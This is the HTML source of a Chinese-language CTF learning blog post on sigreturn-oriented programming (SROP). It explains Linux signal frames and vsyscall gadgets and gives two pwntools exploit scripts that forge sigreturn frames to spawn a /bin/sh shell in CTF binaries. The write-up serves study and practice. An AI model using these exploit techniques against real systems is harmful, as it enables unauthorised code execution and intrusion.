@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Srop," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="srop的学习与思考。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Srop">
+<meta property="og:url" content="https://pursuezhou.github.io/2022/04/16/Pwn/Srop/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="srop的学习与思考。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmL3F.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmq9U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/16/xBmHhT.png">
+<meta property="article:published_time" content="2022-04-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T12:03:37.763Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="Srop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/10/16/xBmL3F.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2022/04/16/Pwn/Srop/"/>
+
+
+
+
+
+  <title>Srop | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2022/04/16/Pwn/Srop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Srop</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-16T00:00:00+08:00">
+                2022-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="srop利用原理"><a href="#srop利用原理" class="headerlink" title="srop利用原理"></a>srop利用原理</h2><h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p>当有中断或者异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文（<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向sigreturn 的系统调用地址，需要注意的是，这一部分是在用户进程的地址空间的</strong>），在跳转到之前注册好的signal handler中进行处理，等到signal handler返回后，内核为该进程恢复保存的上下文，最终恢复执行。</p>
+<p>具体步骤如下：</p>
+<ol>
+<li>一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息</li>
+<li>一个新的返回地址被添加到栈顶，其指向了sigreturn</li>
+<li>signal handler被调用，signal handler的行动取决于收到什么signal</li>
+<li><strong>signal handler执行完之后，返回地址用于执行sigreturn系统调用</strong></li>
+<li><strong>sigreturn利用signal frame恢复寄存器回到之前的状态</strong></li>
+<li>程序继续执行</li>
+</ol>
+<!-- more -->
+
+<h3 id="x86和x64的sigcontext"><a href="#x86和x64的sigcontext" class="headerlink" title="x86和x64的sigcontext"></a>x86和x64的sigcontext</h3><ul>
+<li><strong>x86：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  unsigned short gs, __gsh;</span><br><span class="line">  unsigned short fs, __fsh;</span><br><span class="line">  unsigned short es, __esh;</span><br><span class="line">  unsigned short ds, __dsh;</span><br><span class="line">  unsigned long edi;</span><br><span class="line">  unsigned long esi;</span><br><span class="line">  unsigned long ebp;</span><br><span class="line">  unsigned long esp;</span><br><span class="line">  unsigned long ebx;</span><br><span class="line">  unsigned long edx;</span><br><span class="line">  unsigned long ecx;</span><br><span class="line">  unsigned long eax;</span><br><span class="line">  unsigned long trapno;</span><br><span class="line">  unsigned long err;</span><br><span class="line">  unsigned long eip;</span><br><span class="line">  unsigned short cs, __csh;</span><br><span class="line">  unsigned long eflags;</span><br><span class="line">  unsigned long esp_at_signal;</span><br><span class="line">  unsigned short ss, __ssh;</span><br><span class="line">  struct _fpstate * fpstate;</span><br><span class="line">  unsigned long oldmask;</span><br><span class="line">  unsigned long cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>x64：（大小为0x100)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">struct _fpstate</span><br><span class="line">&#123;</span><br><span class="line">  /* FPU environment matching the 64-bit FXSAVE layout.  */</span><br><span class="line">  __uint16_t        cwd;</span><br><span class="line">  __uint16_t        swd;</span><br><span class="line">  __uint16_t        ftw;</span><br><span class="line">  __uint16_t        fop;</span><br><span class="line">  __uint64_t        rip;</span><br><span class="line">  __uint64_t        rdp;</span><br><span class="line">  __uint32_t        mxcsr;</span><br><span class="line">  __uint32_t        mxcr_mask;</span><br><span class="line">  struct _fpxreg    _st[8];</span><br><span class="line">  struct _xmmreg    _xmm[16];</span><br><span class="line">  __uint32_t        padding[24];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct sigcontext</span><br><span class="line">&#123;</span><br><span class="line">  __uint64_t r8;</span><br><span class="line">  __uint64_t r9;</span><br><span class="line">  __uint64_t r10;</span><br><span class="line">  __uint64_t r11;</span><br><span class="line">  __uint64_t r12;</span><br><span class="line">  __uint64_t r13;</span><br><span class="line">  __uint64_t r14;</span><br><span class="line">  __uint64_t r15;</span><br><span class="line">  __uint64_t rdi;</span><br><span class="line">  __uint64_t rsi;</span><br><span class="line">  __uint64_t rbp;</span><br><span class="line">  __uint64_t rbx;</span><br><span class="line">  __uint64_t rdx;</span><br><span class="line">  __uint64_t rax;</span><br><span class="line">  __uint64_t rcx;</span><br><span class="line">  __uint64_t rsp;</span><br><span class="line">  __uint64_t rip;</span><br><span class="line">  __uint64_t eflags;</span><br><span class="line">  unsigned short cs;</span><br><span class="line">  unsigned short gs;</span><br><span class="line">  unsigned short fs;</span><br><span class="line">  unsigned short __pad0;</span><br><span class="line">  __uint64_t err;</span><br><span class="line">  __uint64_t trapno;</span><br><span class="line">  __uint64_t oldmask;</span><br><span class="line">  __uint64_t cr2;</span><br><span class="line">  __extension__ union</span><br><span class="line">    &#123;</span><br><span class="line">      struct _fpstate * fpstate;</span><br><span class="line">      __uint64_t __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  __uint64_t __reserved1 [8];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="signal机制漏洞利用"><a href="#signal机制漏洞利用" class="headerlink" title="signal机制漏洞利用"></a>signal机制漏洞利用</h3><ul>
+<li>Signal Frame 被保存在用户的地址空间中，<strong>所以用户是可以读写的</strong>。</li>
+<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，<strong>它并不会去记录这个 signal 对应的 Signal Frame</strong>，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>
+<li><strong>32位sigreturn的系统调用号为77、64位sigreturn的系统调用号为15</strong></li>
+</ul>
+<h2 id="srop基本利用"><a href="#srop基本利用" class="headerlink" title="srop基本利用"></a>srop基本利用</h2><blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_4">SROP - CTF Wiki (ctf-wiki.org)</a></p>
+<p>[(11条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]_Angel~Yan的博客-CSDN博客_ciscn_2019_es_7</a></p>
+</blockquote>
+<h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p>给了一个gadget：<code>mov rax, 0xf; ret</code>，设置rax的值为15，然后再调用syscall，就可以实现调用sigreturn。</p>
+<p>WP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ciscn_2019_es_7&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node4.buuoj.cn&quot;, 29776)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004f1</span></span><br><span class="line">gadget = <span class="number">0x4004DA</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">leak_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = leak_addr - <span class="number">0x118</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = ret</span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(gadget) + p64(syscall) + <span class="built_in">str</span>(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="srop进阶"><a href="#srop进阶" class="headerlink" title="srop进阶"></a>srop进阶</h2><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>当我们希望执行一系列函数的时候，如下图所示：</p>
+<p><img src="https://s1.ax1x.com/2022/10/16/xBmL3F.png" alt="srop1"></p>
+<p>需要注意的是，我们利用SROP需要满足以下条件：</p>
+<ul>
+<li>可以控制栈的内容</li>
+<li>需要知道以下地址：<ul>
+<li>“&#x2F;bin&#x2F;sh”</li>
+<li>signal frame</li>
+<li>syscall</li>
+<li>sigreturn</li>
+</ul>
+</li>
+<li>要有足够大的空间容纳signa frame</li>
+</ul>
+<p>有的时候我们无法找到控制rax的可用gadget，我们可以在调用syscall ret前，利用某些函数的返回值来控制rax，例如read函数</p>
+<h3 id="可利用的gadget"><a href="#可利用的gadget" class="headerlink" title="可利用的gadget"></a>可利用的gadget</h3><p><img src="https://s1.ax1x.com/2022/10/16/xBmq9U.png" alt="srop2"></p>
+<p>该技术将内核中一些变量和特定系统调用的实现映射到用户态，程序在调用时就不需要再切入内核，从而加快执行速度，<strong>vsyscall是从固定地址0xffffffffff600000开始，三个系统调用以0x400字节对齐，其他内存以int3指令填充，权限为可读可执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffff600000:		mov	rax,0x60</span><br><span class="line">0xffffffffff600007:		syscall</span><br><span class="line">0xffffffffff600009:		ret</span><br><span class="line">0xffffffffff60000a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600400:		mov	rax,0xc9</span><br><span class="line">0xffffffffff600407:		syscall</span><br><span class="line">0xffffffffff600409:		ret</span><br><span class="line">0xffffffffff60040a:		int3</span><br><span class="line"></span><br><span class="line">0xffffffffff600800:		mov	rax,0x135</span><br><span class="line">0xffffffffff600807:		syscall</span><br><span class="line">0xffffffffff600809:		ret</span><br><span class="line">0xffffffffff60080a:		int3</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要先控制rax的值为0xf，再调用syscall ret就可以调用sigreturn</p>
+<h3 id="具体的利用流程"><a href="#具体的利用流程" class="headerlink" title="具体的利用流程"></a>具体的利用流程</h3><ol>
+<li>利用栈溢出将返回地址覆盖为sigreturn的地址，并在栈上布置fake frame，结构如下：</li>
+</ol>
+<ul>
+<li><strong>RSP：一个可写的地址</strong></li>
+<li><strong>RIP：syscall ret</strong></li>
+<li><strong>RAX：read的系统调用号</strong></li>
+<li><strong>RDI：文件描述符</strong></li>
+<li><strong>RSI：可写的地址</strong></li>
+<li><strong>RDX：读入的字节数，取306</strong></li>
+</ul>
+<ol start="2">
+<li>sigreturn执行完后，执行syscall ret，向可写的地址读入306个字节，<strong>这块内容要包含3个syscall ret、fake frame和其他代码和数据</strong></li>
+<li>read执行完后，返回值被放入rax中，然后再次执行我们布置的syscall ret，<strong>但由于rax的值为306，即syncfs的系统调用号，而该调用总返回0，0又是read的调用号</strong></li>
+<li>这次执行我们布置的第二个syscall ret，即read的调用，<strong>这时候我们输入的内容不重要，主要是字节数，输入15个字节，即sigreturn的系统调用</strong></li>
+<li>执行第三个syscall ret，即sigreturn，从第二个fake frame中恢复数据，可以是执行execve(“&#x2F;bin&#x2F;sh”, 0, 0)，也可以是调用mprotect</li>
+</ol>
+<p>以下是示意图：</p>
+<p><img src="https://s1.ax1x.com/2022/10/16/xBmHhT.png" alt="srop3"></p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>可使用的gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">add rsp, 0x10</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>这里的利用是参照了上文写的流程，要注意的是，这里运用的gadget多了<code>add rsp,0x10</code>的操作，所以在构造fake_frame和控制程序执行流的时候要额外注意rsp的值。</p>
+<p>WP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./TNT&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">xor_rax = <span class="number">0x4000f2</span></span><br><span class="line">syscall_rsp_ret = <span class="number">0x400100</span></span><br><span class="line">area = <span class="number">0x600000</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = <span class="number">0</span></span><br><span class="line">frame1.rsi = area</span><br><span class="line">frame1.rdx = <span class="number">306</span></span><br><span class="line">frame1.rsp = area - <span class="number">0x10</span></span><br><span class="line">frame1.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(xor_rax)</span><br><span class="line">payload1 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(syscall_rsp_ret)</span><br><span class="line">payload1 += <span class="built_in">str</span>(frame1)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = area + <span class="number">8</span>*<span class="number">4</span></span><br><span class="line">frame2.rsi = <span class="number">0</span></span><br><span class="line">frame2.rdx = <span class="number">0</span></span><br><span class="line">frame2.rip = syscall_rsp_ret</span><br><span class="line"></span><br><span class="line">payload2 = p64(syscall_rsp_ret) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload2 += p64(syscall_rsp_ret)</span><br><span class="line">payload2 += <span class="built_in">str</span>(frame2)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">306</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Srop/" rel="tag"># Srop</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/07/01/CTF/2022ciscn%E5%88%9D%E8%B5%9B/" rel="prev" title="2022 ciscn 初赛">
+                2022 ciscn 初赛 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/wechat.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">61</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pursuezhou" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:pursuezhou@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
